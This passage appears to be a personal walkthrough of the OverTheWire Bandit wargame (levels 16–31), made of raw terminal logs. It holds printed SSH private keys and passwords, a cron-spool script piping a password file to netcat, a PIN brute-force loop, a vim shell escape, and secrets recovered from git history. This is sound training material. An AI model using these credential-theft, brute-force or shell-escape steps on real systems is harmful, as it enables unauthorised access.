77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3 vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY= -----END RSA PRIVATE KEY----- bandit16@bandit $ logout Connection to bandit.labs.overthewire.org closed.  bandit17 /wargames/overthewire/bandit$ mkdir bandit17 /wargames/overthewire/bandit$ vim bandit17/id_rsa /wargames/overthewire/bandit$ chmod 0400 bandit17/id_rsa /wargames/overthewire/bandit$ bandit17@bandit.labs.overthewire.org -p 2220 -i bandit17/id_rsa This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit17@bandit $ ls passwords.new passwords.old bandit17@bandit $ diff passwords.new passwords.old 42c42 \u0026lt; kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd --- \u0026gt; hlbSBPAWJmL6WFDb06gpTx1pPButblOA bandit17@bandit $ logout Connection to bandit.labs.overthewire.org closed.  bandit18 /wargames/overthewire/bandit$ bandit18@bandit.labs.overthewire.org -p 2220 ls This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit18@bandit.labs.overthewire.orgs password: readme wargames/overthewire/banditbandit18@bandit.labs.overthewire.org -p 2220 cat readme This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit18@bandit.labs.overthewire.orgs password: IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x  bandit19 bandit19@bandit.labs.overthewire.org -p 2220 -PubkeyAuthentication no This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit19@bandit.labs.overthewire.orgs password: bandit19@bandit $ ls bandit20-do bandit19@bandit $ ./bandit20-do Run a command as another user. Example: ./bandit20-do id bandit19@bandit $ ./bandit20-do cat /etc/bandit_pass/bandit20 GbKksEFF4yrVs6il55v6gwY5aVje5f0j  bandit20 bandit20@bandit.labs.overthewire.org -p 2220 -PubkeyAuthentication no This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit20@bandit.labs.overthewire.orgs password: bandit20@bandit $ ls suconnect bandit20@bandit $ tmux *CTRL+B SHIFT \u0026quot;* bandit20@bandit:~$ ./suconnect 1337 Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j Password matches, sending next password bandit20@bandit:~$ ───────────────────────── bandit20@bandit:~$ bandit20@bandit:~$ nc -l -p 1337 GbKksEFF4yrVs6il55v6gwY5aVje5f0j gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr bandit20@bandit:~$ ^d ^d bandit20@bandit $ tmux [exited] bandit20@bandit $ logout Connection to bandit.labs.overthewire.org closed.  Bandit21 bandit21@bandit.labs.overthewire.org -p 2220 -PubkeyAuthentication no This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit21@bandit.labs.overthewire.orgs password: bandit21@bandit $ cat /etc/cron.d/* @reboot bandit22 /usr/bin/cronjob_bandit22.sh \u0026amp;\u0026gt; /dev/null * * * * * bandit22 /usr/bin/cronjob_bandit22.sh \u0026amp;\u0026gt; /dev/null @reboot bandit23 /usr/bin/cronjob_bandit23.sh \u0026amp;\u0026gt; /dev/null * * * * * bandit23 /usr/bin/cronjob_bandit23.sh \u0026amp;\u0026gt; /dev/null @reboot bandit24 /usr/bin/cronjob_bandit24.sh \u0026amp;\u0026gt; /dev/null * * * * * bandit24 /usr/bin/cronjob_bandit24.sh \u0026amp;\u0026gt; /dev/null bandit21@bandit $ cat /usr/bin/cronjob_bandit2* #!/bin/bash chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv cat /etc/bandit_pass/bandit22 \u0026gt; /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv cat: /usr/bin/cronjob_bandit23.sh: Permission denied cat: /usr/bin/cronjob_bandit24.sh: Permission denied bandit21@bandit $ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI  bandit22 bandit22@bandit.labs.overthewire.org -p 2220 -PubkeyAuthentication no This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit22@bandit.labs.overthewire.orgs password: bandit22@bandit $ cat /etc/cron.d/* @reboot bandit22 /usr/bin/cronjob_bandit22.sh \u0026amp;\u0026gt; /dev/null * * * * * bandit22 /usr/bin/cronjob_bandit22.sh \u0026amp;\u0026gt; /dev/null @reboot bandit23 /usr/bin/cronjob_bandit23.sh \u0026amp;\u0026gt; /dev/null * * * * * bandit23 /usr/bin/cronjob_bandit23.sh \u0026amp;\u0026gt; /dev/null @reboot bandit24 /usr/bin/cronjob_bandit24.sh \u0026amp;\u0026gt; /dev/null * * * * * bandit24 /usr/bin/cronjob_bandit24.sh \u0026amp;\u0026gt; /dev/null bandit22@bandit $ cat /usr/bin/cronjob_bandit23.sh #!/bin/bash myname=$(whoami) mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1) echo \u0026quot;Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget\u0026quot; cat /etc/bandit_pass/$myname \u0026gt; /tmp/$mytarget bandit22@bandit $ mytarget=$(echo I am user bandit23 | md5sum | cut -d ' ' -f 1) bandit22@bandit $ echo $mytarget 8ca319486bfbbc3663ea0fbe81326349 bandit22@bandit $ cat /tmp/8ca319486bfbbc3663ea0fbe81326349 jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n\u0026lt; bandit22@bandit $ logout Connection to bandit.labs.overthewire.org closed.  bandit23 bandit23@bandit.labs.overthewire.org -p 2220 -PubkeyAuthentication no This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit23@bandit.labs.overthewire.orgs password: bandit23@bandit $ cat /usr/bin/cronjob_bandit24.sh #!/bin/bash myname=$(whoami) cd /var/spool/$myname echo \u0026quot;Executing and deleting all scripts in /var/spool/$myname:\u0026quot; for i in * .*; do if [ \u0026quot;$i\u0026quot; != \u0026quot;.\u0026quot; -a \u0026quot;$i\u0026quot; != \u0026quot;..\u0026quot; ]; then echo \u0026quot;Handling $i\u0026quot; timeout -s 9 60 ./$i rm -f ./$i fi done bandit23@bandit $ ls /var/spool/ bandit24 cron mail rsyslog bandit23@bandit $ ls /var/spool/bandit24/ bandit23@bandit $ mkdir /tmp/giv_pass bandit23@bandit $ cd /tmp/giv_pass bandit23@bandit:/tmp/giv_pass$ touch give_pass.sh bandit23@bandit:/tmp/giv_pass$ vim give_pass.sh/\u0026lt;  #/bin/bash cat /etc/bandit_pass/bandit24 | nc 127.0.0.1 1337  bandit23@bandit:/tmp/giv_pass$ tmux CTRL + B SHIFT \u0026quot; bandit23@bandit:/tmp/giv_pass$ cp give_pass.sh /var/spool/bandit24/give_pass.sh bandit23@bandit:/tmp/giv_pass$ ──────────────────────────────────── bandit23@bandit:/tmp/giv_pass$nc -l -p 1337 UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ ^d ^d bandit23@bandit:/tmp/giv_pass$ tmux [exited] bandit23@bandit:/tmp/giv_pass$ logout Connection to bandit.labs.overthewire.org closed.  bandit24 bandit24@bandit.labs.overthewire.org -p 2220 -PubkeyAuthentication no This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit24@bandit.labs.overthewire.orgs password: bandit24@bandit $ nc localhost 30002 I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space. bandit24@bandit $ mkdir /tmp/brute_port bandit24@bandit $ cd /tmp/brute_port bandit24@bandit:/tmp/brute_port$ bandit24@bandit:/tmp/brute_port$ touch brute_port.sh bandit24@bandit:/tmp/brute_port$ chmod +x brute_port.sh bandit24@bandit:/tmp/brute_port$ vim brute_port.sh #/bin/bash for i in {0000..9999} do echo \u0026quot;UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ\u0026quot; $i done bandit24@bandit:/tmp/brute_port$ nc 127.0.0.1 30002 \u0026lt; list | grep -v 'Wrong! Please enter the correct pincode. Try again.' I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space. Correct! The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG Exiting. bandit24@bandit:/tmp/brute_port$ logout Connection to bandit.labs.overthewire.org closed.  bandit25 bandit25@bandit.labs.overthewire.org -p 2220 -PubkeyAuthentication no This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit25@bandit.labs.overthewire.orgs password: bandit25@bandit $ cat /etc/passwd |grep bandit26 bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext bandit25@bandit $ ls -la total 32 drwxr-xr-x 2 root root 4096 Aug 3 19:14 . drwxr-xr-x 41 root root 4096 Oct 16 2018 .. -rw-r----- 1 bandit25 bandit25 33 Aug 3 19:14 .bandit24.password -r-------- 1 bandit25 bandit25 1679 Oct 16 2018 bandit26.sshkey bandit25@bandit $ cat bandit26.sshkey -----BEGIN RSA PRIVATE KEY----- MIIEpQIBAAKCAQEApis2AuoooEqeYWamtwX2k5z9uU1Afl2F8VyXQqbv/LTrIwdW pTfaeRHXzr0Y0a5Oe3GB/+W2+PReif+bPZlzTY1XFwpk+DiHk1kmL0moEW8HJuT9 /5XbnpjSzn0eEAfFax2OcopjrzVqdBJQerkj0puv3UXY07AskgkyD5XepwGAlJOG xZsMq1oZqQ0W29aBtfykuGie2bxroRjuAPrYM4o3MMmtlNE5fC4G9Ihq0eq73MDi 1ze6d2jIGce873qxn308BA2qhRPJNEbnPev5gI+5tU+UxebW8KLbk0EhoXB953Ix 3lgOIrT9Y6skRjsMSFmC6WN/O7ovu8QzGqxdywIDAQABAoIBAAaXoETtVT9GtpHW qLaKHgYtLEO1tOFOhInWyolyZgL4inuRRva3CIvVEWK6TcnDyIlNL4MfcerehwGi il4fQFvLR7E6UFcopvhJiSJHIcvPQ9FfNFR3dYcNOQ/IFvE73bEqMwSISPwiel6w e1DjF3C7jHaS1s9PJfWFN982aublL/yLbJP+ou3ifdljS7QzjWZA8NRiMwmBGPIh Yq8weR3jIVQl3ndEYxO7Cr/wXXebZwlP6CPZb67rBy0jg+366mxQbDZIwZYEaUME zY5izFclr/kKj4s7NTRkC76Yx+rTNP5+BX+JT+rgz5aoQq8ghMw43NYwxjXym/MX c8X8g0ECgYEA1crBUAR1gSkM+5mGjjoFLJKrFP+IhUHFh25qGI4Dcxxh1f3M53le wF1rkp5SJnHRFm9IW3gM1JoF0PQxI5aXHRGHphwPeKnsQ/xQBRWCeYpqTme9amJV tD3aDHkpIhYxkNxqol5gDCAt6tdFSxqPaNfdfsfaAOXiKGrQESUjIBcCgYEAxvmI 2ROJsBXaiM4Iyg9hUpjZIn8TW2UlH76pojFG6/KBd1NcnW3fu0ZUU790wAu7QbbU i7pieeqCqSYcZsmkhnOvbdx54A6NNCR2btc+si6pDOe1jdsGdXISDRHFb9QxjZCj 6xzWMNvb5n1yUb9w9nfN1PZzATfUsOV+Fy8CbG0CgYEAifkTLwfhqZyLk2huTSWm pzB0ltWfDpj22MNqVzR3h3d+sHLeJVjPzIe9396rF8KGdNsWsGlWpnJMZKDjgZsz JQBmMc6UMYRARVP1dIKANN4eY0FSHfEebHcqXLho0mXOUTXe37DWfZza5V9Oify3 JquBd8uUptW1Ue41H4t/ErsCgYEArc5FYtF1QXIlfcDz3oUGz16itUZpgzlb71nd 1cbTm8EupCwWR5I1j+IEQU+JTUQyI1nwWcnKwZI+5kBbKNJUu/mLsRyY/UXYxEZh ibrNklm94373kV1US/0DlZUDcQba7jz9Yp/C3dT/RlwoIw5mP3UxQCizFspNKOSe euPeaxUCgYEAntklXwBbokgdDup/u/3ms5Lb/bm22zDOCg2HrlWQCqKEkWkAO6R5 /Wwyqhp/wTl8VXjxWo+W+DmewGdPHGQQ5fFdqgpuQpGUq24YZS8m66v5ANBwd76t IZdtF5HXs2S5CADTwniUS5mX1HO9l5gUkk+h0cH5JnPtsMCnAUM+BRY= -----END RSA PRIVATE KEY----- bandit25@bandit $ logout Connection to bandit.labs.overthewire.org closed. /wargames/overthewire/bandit$ mkdir bandit26 /wargames/overthewire/bandit$ vim bandit26/id_rsa /wargames/overthewire/bandit$ chmod 0400 bandit26/id_rsa wargames/overthewire/banditbandit26@bandit.labs.overthewire.org -p 2220 -i bandit26/id_rsa This is a OverTheWire game server. More information on http://www.overthewire.org/wargames _ _ _ _ ___ __ | | | (_) | |__ \\ / / | |__ __ _ _ __ __| |_| |_ ) / /_ | '_ \\ / _` | '_ \\ / _` | | __| / / '_ \\ | |_) | (_| | | | | (_| | | |_ / /| (_) | |_.__/ \\__,_|_| |_|\\__,_|_|\\__|____\\___/ Connection to bandit.labs.overthewire.org closed. /wargames/overthewire/bandit$ bandit25@bandit.labs.overthewire.org -p 2220 -PubkeyAuthentication no This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit25@bandit.labs.overthewire.orgs password: bandit25@bandit $ /usr/bin/showtext more: stat of /home/bandit25/text.txt failed: No such file or directory\u0026gt; bandit25@bandit $ strace /usr/bin/showtext execve(\u0026quot;/usr/bin/showtext\u0026quot;, [\u0026quot;/usr/bin/showtext\u0026quot;], [/* 26 vars */]) = 0 brk(NULL) = 0x557a08cc3000 access(\u0026quot;/etc/ld.so.nohwcap\u0026quot;, F_OK) = -1 ENOENT (No such file or directory) access(\u0026quot;/etc/ld.so.preload\u0026quot;, R_OK) = -1 ENOENT (No such file or directory) open(\u0026quot;/etc/ld.so.cache\u0026quot;, O_RDONLY|O_CLOEXEC) = 3 fstat(3, {st_mode=S_IFREG|0644, st_size=35184, ...}) = 0 mmap(NULL, 35184, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fe1abf31000 close(3) = 0 access(\u0026quot;/etc/ld.so.nohwcap\u0026quot;, F_OK) = -1 ENOENT (No such file or directory) open(\u0026quot;/lib/x86_64-linux-gnu/libc.so.6\u0026quot;, O_RDONLY|O_CLOEXEC) = 3 read(3, \u0026quot;\\177ELF\\2\\1\\1\\3\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0\u0026gt;\\0\\1\\0\\0\\0\\0\\4\\2\\0\\0\\0\\0\\0\u0026quot;..., 832) = 832 fstat(3, {st_mode=S_IFREG|0755, st_size=1689360, ...}) = 0 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fe1abf2f000 mmap(NULL, 3795296, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7fe1ab978000 mprotect(0x7fe1abb0d000, 2097152, PROT_NONE) = 0 mmap(0x7fe1abd0d000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x195000) = 0x7fe1abd0d000 mmap(0x7fe1abd13000, 14688, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7fe1abd13000 close(3) = 0 arch_prctl(ARCH_SET_FS, 0x7fe1abf30480) = 0 mprotect(0x7fe1abd0d000, 16384, PROT_READ) = 0 mprotect(0x557a07eb9000, 8192, PROT_READ) = 0 mprotect(0x7fe1abf3a000, 4096, PROT_READ) = 0 munmap(0x7fe1abf31000, 35184) = 0 getpid() = 5008 rt_sigaction(SIGCHLD, {sa_handler=0x557a07cafef0, sa_mask=~[RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x7fe1ab9ab060}, NULL, 8) = 0 geteuid() = 11025 brk(NULL) = 0x557a08cc3000 brk(0x557a08ce4000) = 0x557a08ce4000 getppid() = 5006 stat(\u0026quot;/home/bandit25\u0026quot;, {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0 stat(\u0026quot;.\u0026quot;, {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0 open(\u0026quot;/usr/bin/showtext\u0026quot;, O_RDONLY) = 3 fcntl(3, F_DUPFD, 10) = 10 close(3) = 0 fcntl(10, F_SETFD, FD_CLOEXEC) = 0 rt_sigaction(SIGINT, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0 rt_sigaction(SIGINT, {sa_handler=0x557a07cafef0, sa_mask=~[RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x7fe1ab9ab060}, NULL, 8) = 0 rt_sigaction(SIGQUIT, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0 rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=~[RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x7fe1ab9ab060}, NULL, 8) = 0 rt_sigaction(SIGTERM, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0 rt_sigaction(SIGTERM, {sa_handler=SIG_DFL, sa_mask=~[RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x7fe1ab9ab060}, NULL, 8) = 0 read(10, \u0026quot;#!/bin/sh\\n\\nexport TERM=linux\\n\\nmo\u0026quot;..., 8192) = 53 stat(\u0026quot;/usr/local/bin/more\u0026quot;, 0x7ffce0457a00) = -1 ENOENT (No such file or directory) stat(\u0026quot;/usr/bin/more\u0026quot;, 0x7ffce0457a00) = -1 ENOENT (No such file or directory) stat(\u0026quot;/bin/more\u0026quot;, {st_mode=S_IFREG|0755, st_size=39736, ...}) = 0 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7fe1abf30750) = 5009 wait4(-1, more: stat of /home/bandit25/text.txt failed: No such file or directory [{WIFEXITED(s) \u0026amp;\u0026amp; WEXITSTATUS(s) == 0}], 0, NULL) = 5009 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=5009, si_uid=11025, si_status=0, si_utime=0, si_stime=0} --- rt_sigreturn({mask=[]}) = 5009 exit_group(0) = ? +++ exited with 0 +++ .... stat(\u0026quot;/usr/local/bin/more\u0026quot;, 0x7ffc5ab62220) = -1 ENOENT (No such file or directory) stat(\u0026quot;/usr/bin/more\u0026quot;, 0x7ffc5ab62220) = -1 ENOENT (No such file or directory) stat(\u0026quot;/bin/more\u0026quot;, {st_mode=S_IFREG|0755, st_size=39736, ...}) = 0 .... wait4(-1, more: stat of /home/bandit25/text.txt failed: No such file or directory .... bandit25@bandit $ cat /usr/bin/showtext #!/bin/sh export TERM=linux more ~/text.txt exit 0 bandit25@bandit $ more Usage: more [options] \u0026lt;file\u0026gt;... A file perusal filter for CRT viewing. Options: -d display help instead of ringing bell -f count logical rather than screen lines -l suppress pause after form feed -c do not scroll, display text and clean line ends -p do not scroll, clean screen and display text -s squeeze multiple blank lines into one -u suppress underlining -\u0026lt;number\u0026gt; the number of lines per screenful +\u0026lt;number\u0026gt; display file beginning from line number +/\u0026lt;string\u0026gt; display file beginning from search string match -V display version information and exit For more details see more(1). * RESIZE WINDOW ** bandit25@bandit.labs.overthewire.org -p 2220 -PubkeyAuthentication no _ _ _ _ ___ __ | | | (_) | |__ \\ / / | |__ __ _ _ __ __| |_| |_ ) / /_ | '_ \\ / _` | '_ \\ / _` | | __| / / '_ \\ | |_) | (_| | | | | (_| | | |_ / /| (_) | --More--(83%) **press v for vim * :set shell=/bin/bash :shell bandit26@bandit:~$ bandit26@bandit:~$ cat /etc/bandit_pass/bandit26 5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z  bandit27 bandit26@bandit:~$ ls -la total 36 drwxr-xr-x 3 root root 4096 Oct 16 2018 . drwxr-xr-x 41 root root 4096 Oct 16 2018 .. -rwsr-x--- 1 bandit27 bandit26 7296 Oct 16 2018 bandit27-do -rw-r--r-- 1 root root 220 May 15 2017 .bash_logout -rw-r--r-- 1 root root 3526 May 15 2017 .bashrc -rw-r--r-- 1 root root 675 May 15 2017 .profile drwxr-xr-x 2 root root 4096 Oct 16 2018 .ssh -rw-r----- 1 bandit26 bandit26 258 Oct 16 2018 text.txt bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27 3ba3118a22e93127a4ed485be72ef5ea  bandit28 bandit26@bandit:$ mkdir /tmp/giv_git bandit26@bandit:$ cd /tmp/giv_git bandit26@bandit:/tmp/giv_pass$ bandit26@bandit:/tmp/giv_git$ git clone ssh://bandit27-git@localhost/home/bandit27-git/repo.git Cloning into 'repo'... The authenticity of host 'localhost (127.0.0.1)' can't be established. ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc. Are you sure you want to continue connecting (yes/no)? yes Failed to add the host to the list of known hosts (/home/bandit26/.ssh/known_hosts). This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit27-git@localhost's password: remote: Counting objects: 3, done. remote: Compressing objects: 100% (2/2), done. remote: Total 3 (delta 0), reused 0 (delta 0) Receiving objects: 100% (3/3), done. bandit26@bandit:/tmp/giv_git$ ls repo bandit26@bandit:/tmp/giv_git$ cd repo/ bandit26@bandit:/tmp/giv_git/repo$ ls README bandit26@bandit:/tmp/giv_git/repo$ cat README The password to the next level is: 0ef186ac70e04ea33b4c1853d2526fa2  bandit28 - 2 bandit26@bandit:/tmp/giv_git/repo$ cd .. bandit26@bandit:/tmp/giv_git$ rm repo/ -rf bandit26@bandit:/tmp/giv_git$ git clone ssh://bandit28-git@localhost/home/bandit28-git/repo.git Cloning into 'repo'... The authenticity of host 'localhost (127.0.0.1)' can't be established. ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc. Are you sure you want to continue connecting (yes/no)? yes Failed to add the host to the list of known hosts (/home/bandit26/.ssh/known_hosts). This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit28-git@localhost's password: remote: Counting objects: 9, done. remote: Compressing objects: 100% (6/6), done. remote: Total 9 (delta 2), reused 0 (delta 0) Receiving objects: 100% (9/9), done. Resolving deltas: 100% (2/2), done. bandit26@bandit:/tmp/giv_git$ ls repo bandit26@bandit:/tmp/giv_git$ cd repo/ bandit26@bandit:/tmp/giv_git/repo$ ls -la total 16 drwxr-sr-x 3 bandit26 root 4096 Sep 11 17:11 . drwxr-sr-x 3 bandit26 root 4096 Sep 11 17:11 .. drwxr-sr-x 8 bandit26 root 4096 Sep 11 17:11 .git -rw-r--r-- 1 bandit26 root 111 Sep 11 17:11 README.md bandit26@bandit:/tmp/giv_git/repo$ git log commit 073c27c130e6ee407e12faad1dd3848a110c4f95 Author: Morla Porla \u0026lt;morla@overthewire.org\u0026gt; Date: Tue Oct 16 14:00:39 2018 +0200 fix info leak commit 186a1038cc54d1358d42d468cdc8e3cc28a93fcb Author: Morla Porla \u0026lt;morla@overthewire.org\u0026gt; Date: Tue Oct 16 14:00:39 2018 +0200 add missing data commit b67405defc6ef44210c53345fc953e6a21338cc7 Author: Ben Dover \u0026lt;noone@overthewire.org\u0026gt; Date: Tue Oct 16 14:00:39 2018 +0200 initial commit of README.md bandit26@bandit:/tmp/giv_git/repo$ git checkout 186a1038cc54d1358d42d468cdc8e3cc28a93fcb Note: checking out '186a1038cc54d1358d42d468cdc8e3cc28a93fcb'. You are in 'detached HEAD' state. You can look around, make experimental changes and commit them, and you can discard any commits you make in this state without impacting any branches by performing another checkout. If you want to create a new branch to retain commits you create, you may do so (now or later) by using -b with the checkout command again. Example: git checkout -b \u0026lt;new-branch-name\u0026gt; HEAD is now at 186a103... add missing data bandit26@bandit:/tmp/giv_git/repo$ cat README.md # Bandit Notes Some notes for level29 of bandit. ## credentials - username: bandit29 - password: bbc96594b4e001778eee9975372716b2 bandit26@bandit:/tmp/giv_git/repo$ git checkout b67405defc6ef44210c53345fc953e6a21338cc7 Previous HEAD position was 186a103... add missing data HEAD is now at b67405d... initial commit of README.md bandit26@bandit:/tmp/giv_git/repo$ cat README.md # Bandit Notes Some notes for level29 of bandit. ## credentials - username: bandit29 - password: \u0026lt;TBD\u0026gt;  bandit29 bandit26@bandit:/tmp/giv_git/repo$ cd .. bandit26@bandit:/tmp/giv_git$ rm -rf repo/ bandit26@bandit:/tmp/giv_git$ bandit26@bandit:/tmp/giv_git$ git clone ssh://bandit29-git@localhost/home/bandit29-git/repo Cloning into 'repo'... The authenticity of host 'localhost (127.0.0.1)' can't be established. ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc. Are you sure you want to continue connecting (yes/no)? yes Failed to add the host to the list of known hosts (/home/bandit26/.ssh/known_hosts). This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit29-git@localhost's password: remote: Counting objects: 16, done. remote: Compressing objects: 100% (11/11), done. remote: Total 16 (delta 2), reused 0 (delta 0) Receiving objects: 100% (16/16), done. Resolving deltas: 100% (2/2), done. bandit26@bandit:/tmp/giv_git$ ls -la total 2092 drwxr-sr-x 3 bandit26 root 4096 Sep 11 17:15 . drwxrws-wt 18980 root root 2129920 Sep 11 17:15 .. drwxr-sr-x 3 bandit26 root 4096 Sep 11 17:15 repo bandit26@bandit:/tmp/giv_git$ cd repo/ bandit26@bandit:/tmp/giv_git/repo$ ls -la total 16 drwxr-sr-x 3 bandit26 root 4096 Sep 11 17:15 . drwxr-sr-x 3 bandit26 root 4096 Sep 11 17:15 .. drwxr-sr-x 8 bandit26 root 4096 Sep 11 17:15 .git -rw-r--r-- 1 bandit26 root 131 Sep 11 17:15 README.md bandit26@bandit:/tmp/giv_git/repo$ cat README.md # Bandit Notes Some notes for bandit30 of bandit. ## credentials - username: bandit30 - password: \u0026lt;no passwords in production!\u0026gt; bandit26@bandit:/tmp/giv_git/repo$ git branch -a * master remotes/origin/HEAD -\u0026gt; origin/master remotes/origin/dev remotes/origin/master remotes/origin/sploits-dev bandit26@bandit:/tmp/giv_git/repo$ git checkout dev Branch dev set up to track remote branch dev from origin. Switched to a new branch 'dev' bandit26@bandit:/tmp/giv_git/repo$ cat README.md # Bandit Notes Some notes for bandit30 of bandit. ## credentials - username: bandit30 - password: 5b90576bedb2cc04c86a9e924ce42faf  bandit30 bandit26@bandit:/tmp/giv_git/repo$ cd .. bandit26@bandit:/tmp/giv_git$ rm -rf repo/ bandit26@bandit:/tmp/giv_git$ git clone ssh://bandit30-git@localhost/home/bandit30-git/repo Cloning into 'repo'... The authenticity of host 'localhost (127.0.0.1)' can't be established. ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc. Are you sure you want to continue connecting (yes/no)? yes Failed to add the host to the list of known hosts (/home/bandit26/.ssh/known_hosts). This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit30-git@localhost's password: remote: Counting objects: 4, done. remote: Total 4 (delta 0), reused 0 (delta 0) Receiving objects: 100% (4/4), done. bandit26@bandit:/tmp/giv_git$ bandit26@bandit:/tmp/giv_git$ ls repo bandit26@bandit:/tmp/giv_git$ cd repo/ bandit26@bandit:/tmp/giv_git/repo$ ls -la total 16 drwxr-sr-x 3 bandit26 root 4096 Sep 11 17:19 . drwxr-sr-x 3 bandit26 root 4096 Sep 11 17:18 .. drwxr-sr-x 8 bandit26 root 4096 Sep 11 17:19 .git -rw-r--r-- 1 bandit26 root 30 Sep 11 17:19 README.md bandit26@bandit:/tmp/giv_git/repo$ cat README.md just an epmty file... muahaha andit26@bandit:/tmp/giv_git/repo/.git$ git tag -l secret bandit26@bandit:/tmp/giv_git/repo/.git$ git show-ref --tags f17132340e8ee6c159e0a4a6bc6f80e1da3b1aea refs/tags/secret bandit26@bandit:/tmp/giv_git/repo$ git show secret 47e603bb428404d265f59c42920d81e5  bandit31 bandit26@bandit:/tmp/giv_git/repo$ cd .. bandit26@bandit:/tmp/giv_git$ rm -rf repo/ bandit26@bandit:/tmp/giv_git$ ssh://bandit31-git@localhost/home/bandit31-git/repo bash: ssh://bandit31-git@localhost/home/bandit31-git/repo: No such file or directory bandit26@bandit:/tmp/giv_git$ git clone ssh://bandit31-git@localhost/home/bandit31-git/repo Cloning into 'repo'... The authenticity of host 'localhost (127.0.0.1)' can't be established. ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc. Are you sure you want to continue connecting (yes/no)? yes Failed to add the host to the list of known hosts (/home/bandit26/.ssh/known_hosts). This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit31-git@localhost's password: remote: Counting objects: 4, done. remote: Compressing objects: 100% (3/3), done. remote: Total 4 (delta 0), reused 0 (delta 0) Receiving objects: 100% (4/4), done. bandit26@bandit:/tmp/giv_git$ bandit26@bandit:/tmp/giv_git$ ls repo bandit26@bandit:/tmp/giv_git$ cd repo/ bandit26@bandit:/tmp/giv_git/repo$ ls -la total 24 drwxr-sr-x 3 bandit26 root 4096 Sep 11 17:37 . drwxr-sr-x 3 bandit26 root 4096 Sep 11 17:36 .. drwxr-sr-x 8 bandit26 root 4096 Sep 11 17:37 .git -rw-r--r-- 1 bandit26 root 6 Sep 11 17:35 .gitignore -rw-r--r-- 1 bandit26 root 15 Sep 11 17:37 key.txt -rw-r--r-- 1 bandit26 root 147 Sep 11 17:35 README.md bandit26@bandit:/tmp/giv_git/repo$ cat .gitignore *.txt bandit26@bandit:/tmp/giv_git/repo$ cat README.md This time your task is to push a file to the remote repository. Details: File name: key.txt Content: 'May I come in?' Branch: master bandit26@bandit:/tmp/giv_git/repo$ vim key.txt May I come in? bandit26@bandit:/tmp/giv_git/repo$ rm .gitignore bandit26@bandit:/tmp/giv_git/repo$ git add key.txt bandit26@bandit:/tmp/giv_git/repo$ git commit -m \u0026quot;Added key.txt\u0026quot; *** Please tell me who you are. Run git config --global user.email \u0026quot;you@example.com\u0026quot; git config --global user.name \u0026quot;Your 